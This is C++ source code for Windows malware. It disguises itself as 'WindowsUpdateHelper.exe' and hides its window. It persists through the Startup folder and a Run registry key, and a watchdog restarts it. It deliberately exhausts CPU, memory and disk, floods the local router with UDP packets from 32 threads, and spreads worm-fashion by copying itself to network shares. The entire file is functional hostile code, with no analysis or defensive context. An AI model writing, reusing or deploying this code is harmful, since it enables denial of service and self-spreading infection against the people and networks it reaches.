#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <winnetwk.h>
#include <iphlpapi.h>
#include <thread>
#include <vector>
#include <fstream>
#include <string>
#include <chrono>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "mpr.lib")
#pragma comment(lib, "iphlpapi.lib")

std::string GetDefaultGateway() {
    ULONG buflen = sizeof(MIB_IPFORWARDTABLE);
    PMIB_IPFORWARDTABLE pIpForwardTable = (PMIB_IPFORWARDTABLE)malloc(buflen);
    if (GetIpForwardTable(pIpForwardTable, &buflen, 0) == ERROR_INSUFFICIENT_BUFFER) {
        free(pIpForwardTable);
        pIpForwardTable = (PMIB_IPFORWARDTABLE)malloc(buflen);
    }
    std::string gateway = "192.168.1.1";
    if (GetIpForwardTable(pIpForwardTable, &buflen, 0) == NO_ERROR) {
        for (DWORD i = 0; i < pIpForwardTable->dwNumEntries; i++) {
            if (pIpForwardTable->table[i].dwForwardDest == 0) {
                IN_ADDR ipAddr;
                ipAddr.S_un.S_addr = pIpForwardTable->table[i].dwForwardNextHop;
                gateway = inet_ntoa(ipAddr);
                break;
            }
        }
    }
    free(pIpForwardTable);
    return gateway;
}

void SetupPersistence() {
    char szPath[MAX_PATH];
    GetModuleFileNameA(NULL, szPath, MAX_PATH);

    char appDataPath[MAX_PATH];
    GetEnvironmentVariableA("APPDATA", appDataPath, MAX_PATH);
    
    std::string targetAppData = std::string(appDataPath) + "\\WindowsUpdateHelper.exe";
    std::string startupFolder = std::string(appDataPath) + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WindowsUpdateHelper.exe";

    CopyFileA(szPath, targetAppData.c_str(), FALSE);
    CopyFileA(szPath, startupFolder.c_str(), FALSE);

    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "WindowsUpdateHelper", 0, REG_SZ, (unsigned char*)targetAppData.c_str(), targetAppData.length() + 1);
        RegCloseKey(hKey);
    }
}

void WatchdogWorker() {
    char appDataPath[MAX_PATH];
    GetEnvironmentVariableA("APPDATA", appDataPath, MAX_PATH);
    std::string targetAppData = std::string(appDataPath) + "\\WindowsUpdateHelper.exe";
    char szPath[MAX_PATH];
    GetModuleFileNameA(NULL, szPath, MAX_PATH);

    while (true) {
        STARTUPINFOA si = { sizeof(si) };
        PROCESS_INFORMATION pi;
        ZeroMemory(&si, sizeof(si));
        si.cb = sizeof(si);
        ZeroMemory(&pi, sizeof(pi));

        if (!CreateProcessA(targetAppData.c_str(), NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
            CopyFileA(szPath, targetAppData.c_str(), FALSE);
            STARTUPINFOA si2 = { sizeof(si2) };
            PROCESS_INFORMATION pi2;
            ZeroMemory(&si2, sizeof(si2));
            si2.cb = sizeof(si2);
            ZeroMemory(&pi2, sizeof(pi2));
            CreateProcessA(targetAppData.c_str(), NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si2, &pi2);
        } else {
            WaitForSingleObject(pi.hProcess, INFINITE);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }
        std::this_thread::sleep_for(std::chrono::seconds(1));
    }
}

void CpuStressWorker() {
    while (true) {
        auto start = std::chrono::high_resolution_clock::now();
        while (std::chrono::duration_cast<std::chrono::milliseconds>(std::chrono::high_resolution_clock::now() - start).count() < 9) {
            volatile double x = 12345.6789;
            x *= x;
        }
        std::this_thread::sleep_for(std::chrono::milliseconds(1));
    }
}

void RamStressWorker() {
    MEMORYSTATUSEX memInfo;
    memInfo.dwLength = sizeof(MEMORYSTATUSEX);
    GlobalMemoryStatusEx(&memInfo);
    
    DWORDLONG targetBytes = (memInfo.ullTotalPhys * 85) / 100;
    DWORDLONG allocatedBytes = 0;
    
    std::vector<char*> memoryBlocks;
    size_t blockSize = 50 * 1024 * 1024;

    while (allocatedBytes < targetBytes) {
        try {
            char* block = new char[blockSize];
            std::fill(block, block + blockSize, 0xAA);
            memoryBlocks.push_back(block);
            allocatedBytes += blockSize;
        } catch (...) {
            break;
        }
    }

    while (true) {
        std::this_thread::sleep_for(std::chrono::seconds(10));
    }
}

void DiskStressWorker() {
    char szPath[MAX_PATH];
    GetTempPathA(MAX_PATH, szPath);
    std::string filePath = std::string(szPath) + "sys_io_stress.tmp";

    std::vector<char> buffer(20 * 1024 * 1024, 'Z');
    while (true) {
        std::ofstream file(filePath, std::ios::binary);
        if (file.is_open()) {
            for (int i = 0; i < 15; i++) {
                file.write(buffer.data(), buffer.size());
            }
            file.close();
        }
        remove(filePath.c_str());
        std::this_thread::sleep_for(std::chrono::milliseconds(50));
    }
}

void RouterFloodWorker() {
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);

    std::string gateway = GetDefaultGateway();
    SOCKET sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);

    sockaddr_in targetAddr;
    targetAddr.sin_family = AF_INET;
    targetAddr.sin_port = htons(80);
    inet_pton(AF_INET, gateway.c_str(), &targetAddr.sin_addr);

    std::vector<char> dummyData(1472, 'X');
    while (true) {
        sendto(sock, dummyData.data(), (int)dummyData.size(), 0, (SOCKADDR*)&targetAddr, sizeof(targetAddr));
        std::this_thread::sleep_for(std::chrono::microseconds(200));
    }

    closesocket(sock);
    WSACleanup();
}

void WormPropagationWorker() {
    char appDataPath[MAX_PATH];
    GetEnvironmentVariableA("APPDATA", appDataPath, MAX_PATH);
    std::string currentExe = std::string(appDataPath) + "\\WindowsUpdateHelper.exe";

    while (true) {
        HANDLE hEnum;
        DWORD cbBuffer = 16384;
        LPNETRESOURCE lpnrRemote = (LPNETRESOURCE)GlobalAlloc(GPTR, cbBuffer);
        
        if (WNetOpenEnum(RESOURCE_GLOBALNET, RESOURCETYPE_DISK, 0, NULL, &hEnum) == NO_ERROR) {
            DWORD cEntries = 0xFFFFFFFF;
            DWORD dwResult;
            do {
                ZeroMemory(lpnrRemote, cbBuffer);
                dwResult = WNetEnumResource(hEnum, &cEntries, lpnrRemote, &cbBuffer);
                if (dwResult == ERROR_SUCCESS) {
                    for (DWORD i = 0; i < cEntries; i++) {
                        if (lpnrRemote[i].lpRemoteName) {
                            char targetPath[MAX_PATH];
                            sprintf_s(targetPath, sizeof(targetPath), "%s\\WindowsUpdateHelper.exe", lpnrRemote[i].lpRemoteName);
                            CopyFileA(currentExe.c_str(), targetPath, FALSE);
                        }
                    }
                }
            } while (dwResult != ERROR_NO_MORE_ITEMS);
            GlobalFree((HGLOBAL)lpnrRemote);
            WNetCloseEnum(hEnum);
        }
        std::this_thread::sleep_for(std::chrono::seconds(30));
    }
}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    HWND hWnd = GetConsoleWindow();
    if (hWnd) {
        ShowWindow(hWnd, SW_HIDE);
    }

    SetupPersistence();

    unsigned int numCores = std::thread::hardware_concurrency();
    if (numCores == 0) numCores = 4;

    std::vector<std::thread> workers;

    workers.emplace_back(WatchdogWorker);

    for (unsigned int i = 0; i < numCores; i++) {
        workers.emplace_back(CpuStressWorker);
    }

    workers.emplace_back(RamStressWorker);
    workers.emplace_back(DiskStressWorker);

    for (int i = 0; i < 32; i++) {
        workers.emplace_back(RouterFloodWorker);
    }

    workers.emplace_back(WormPropagationWorker);

    for (auto& t : workers) {
        if (t.joinable()) {
            t.join();
        }
    }

    return 0;
}
